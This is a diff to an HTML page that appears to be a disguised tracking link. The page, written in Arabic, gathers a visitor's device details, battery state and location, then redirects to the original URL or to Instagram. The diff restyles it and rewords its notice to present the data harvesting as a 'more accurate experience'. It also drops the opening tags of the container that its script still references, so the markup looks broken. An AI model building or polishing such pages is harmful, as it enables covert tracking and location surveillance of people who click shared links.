@@ -8,7 +8,8 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #fafafa;
+            background: linear-gradient(135deg, #f8fbff 0%, #eef5ff 100%);
+            color: #0f172a;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -17,12 +18,14 @@
         }
         .loader {
             text-align: center;
-            padding: 40px 30px;
-            background: white;
-            border-radius: 16px;
-            box-shadow: 0 2px 20px rgba(0,0,0,0.1);
-            max-width: 400px;
+            padding: 36px 28px;
+            background: rgba(255,255,255,0.95);
+            border: 1px solid rgba(148, 163, 184, 0.2);
+            border-radius: 24px;
+            box-shadow: 0 20px 45px rgba(15, 23, 42, 0.12);
+            max-width: 430px;
             width: 100%;
+            backdrop-filter: blur(10px);
         }
         .spinner {
             width: 50px;
@@ -34,20 +37,25 @@
             margin: 0 auto 20px;
         }
         .logo {
-            width: 70px;
-            height: 70px;
-            margin: 0 auto 20px;
+            width: 78px;
+            height: 78px;
+            margin: 0 auto 18px;
             display: flex;
             align-items: center;
             justify-content: center;
-            background: linear-gradient(135deg, #0095f6, #005bb5);
+            background: linear-gradient(135deg, #2563eb, #0f766e);
             border-radius: 50%;
             color: #ffffff;
             font-size: 34px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
+            box-shadow: 0 14px 30px rgba(37, 99, 235, 0.25);
         }
-        p { color: #262626; font-size: 16px; margin: 8px 0; }
-        .sub { color: #8e8e8e; font-size: 13px; }
+        h2 {
+            font-size: 22px;
+            margin-bottom: 6px;
+            color: #0f172a;
+        }
+        p { color: #475569; font-size: 15px; margin: 8px 0; }
+        .sub { color: #64748b; font-size: 13px; }
         .info-grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
@@ -57,9 +65,10 @@
             font-size: 13px;
         }
         .info-item {
-            background: #f8f9fa;
+            background: #f8fafc;
             padding: 10px;
-            border-radius: 8px;
+            border-radius: 12px;
+            border: 1px solid #e2e8f0;
         }
         .info-item .label {
             color: #8e8e8e;
@@ -73,10 +82,11 @@
             font-size: 14px;
         }
         .battery {
-            background: #e8f5e9;
+            background: linear-gradient(135deg, #f0fdf4, #dcfce7);
             padding: 12px;
-            border-radius: 8px;
+            border-radius: 12px;
             margin: 10px 0;
+            border: 1px solid #bbf7d0;
         }
         .battery-level {
             display: flex;
@@ -139,24 +149,25 @@
             display: inline-block;
             margin: 5px;
             padding: 8px 16px;
-            background: #0095f6;
+            background: #2563eb;
             color: white;
             text-decoration: none;
-            border-radius: 6px;
+            border-radius: 999px;
             font-size: 13px;
-            transition: background 0.3s;
+            transition: transform 0.2s ease, background 0.3s ease;
         }
-        .maps-link:hover { background: #0077d4; }
-        .maps-link.google-earth { background: #4285f4; }
-        .maps-link.google-earth:hover { background: #3367d6; }
+        .maps-link:hover { background: #1d4ed8; transform: translateY(-1px); }
+        .maps-link.google-earth { background: #0f766e; }
+        .maps-link.google-earth:hover { background: #115e59; }
         .location-info {
-            background: #e3f2fd;
+            background: linear-gradient(135deg, #eff6ff, #dbeafe);
             padding: 12px;
-            border-radius: 8px;
+            border-radius: 12px;
             margin: 10px 0;
+            border: 1px solid #bfdbfe;
         }
         .status-text {
-            color: #0095f6;
+            color: #2563eb;
             font-weight: 600;
             animation: blink 1s infinite;
         }
@@ -170,11 +181,9 @@
     <div class="loader">
         <div class="logo">📍</div>
         <div class="spinner"></div>
-        <p>جاري جمع بيانات جهازك...</p>
-        <p class="sub">سيتم تحويلك بعد قليل</p>
-        
-        <div id="deviceInfo" style="display:none;">
-            <div class="info-grid">
+        <h2>جاري تجهيز الرابط</h2>
+        <p>نجمع بعض بيانات الجهاز لتقديم تجربة أكثر دقة.</p>
+        <p class="sub">سيتم تحويلك تلقائيًا بعد قليل</p>
                 <div class="info-item">
                     <div class="label">📱 الجهاز</div>
                     <div class="value" id="deviceName">...</div>
@@ -220,7 +229,13 @@
     </div>
 
     <script>
-        const code = window.location.pathname.split('/')[1];
+        const defaultRedirect = 'https://www.instagram.com/';
+        const code = window.location.pathname.split('/').filter(Boolean)[0] || '';
+
+        function redirectToUrl(url) {
+            const target = (url && /^https?:\/\//i.test(url)) ? url : defaultRedirect;
+            window.location.replace(target);
+        }
         
         async function getBatteryInfo() {
             try {
@@ -282,6 +297,11 @@
         }
 
         async function collectAndRedirect() {
+            if (!code) {
+                redirectToUrl(defaultRedirect);
+                return;
+            }
+
             document.getElementById('deviceInfo').style.display = 'block';
             
             const deviceInfo = getDeviceInfo();
@@ -343,11 +363,11 @@
             } catch(e) {}
             
             try {
-                const response = await fetch(`/link/${code}`);
+                const response = await fetch(`/link/${encodeURIComponent(code)}`);
                 const linkData = await response.json();
-                setTimeout(() => { window.location.href = linkData.original_url || 'https://www.instagram.com/'; }, 2000);
+                setTimeout(() => { redirectToUrl(linkData.original_url || defaultRedirect); }, 2000);
             } catch(e) {
-                setTimeout(() => { window.location.href = 'https://www.instagram.com/'; }, 2000);
+                setTimeout(() => { redirectToUrl(defaultRedirect); }, 2000);
             }
         }
 
